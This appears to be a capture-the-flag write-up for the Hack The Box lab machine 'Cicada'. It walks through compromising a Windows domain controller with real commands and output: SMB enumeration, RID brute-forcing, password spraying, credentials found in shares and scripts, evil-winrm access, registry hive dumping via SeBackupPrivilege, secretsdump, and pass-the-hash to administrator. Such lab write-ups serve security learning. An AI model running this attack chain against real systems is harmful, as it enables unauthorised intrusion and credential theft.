---
layout: post
title: HTB - Cicada
date: 2025-02-16 09:02 -0400
---

![image](/assets/img/cicada.png)

# nmap

```bash
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.18s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
53668/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 173.21 seconds
```

smb accepts anonymous login, and there is a file in the HR share.
```

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Doesn't seem to have a username, only a password. By doing `netexec smb $(cat ip.txt) -u guest -p '' --rid-brute` we can get a list of usernames.
Then we just check the password against every one of them.
```
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

To try every user:
`netexec smb $(cat ip.txt) -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'`

Got a match on michael:

`SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`

Lets try and check winrm. No winrm, so probably just more shares?
Cannot read the DEV share.

Running enum4linux gives a lot of info. Including a second account with credentials.
```
'1108':
  username: david.orelious
  name: (null)
  acb: '0x00000210'
  description: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

Still no winrm. But this one can read the DEV share.
```
smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' '\\cicada.htb\dev'
smb: \> ls
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024
```

A third account on the powershell script.
```bash
...
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
...
```

This one gives us the winrm and the user flag.
```bash
~/workspace/projects/htb/cicada » evil-winrm -i $(cat ip.txt) -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> type ..\Desktop\user.txt
e3152***************************
```

Seems that the SeBackupPrivilege allows you to read any file on the system. So we can just get the registries and get Admin maybe?
```bash
Type "WHOAMI /?" for usage.*Evil-WinRM* PS C:\Users\emilwhoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We can save SAM and SYSTEM by doing:
`cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"`
Then just download them with winrm.
After that we use impacket secretsdump.py to get the admin hash. And the root flag.
`secretsdump.py -sam SAM -system SYSTEM LOCAL`

```bash
~/workspace/projects/htb/cicada » netexec winrm $(cat ip.txt) -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341' -x 'type C:\Users\Administrator\Desktop\root.txt'
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
WINRM       10.10.11.35     5985   CICADA-DC        [+] Executed command (shell type: cmd)
WINRM       10.10.11.35     5985   CICADA-DC        a910c***************************
```
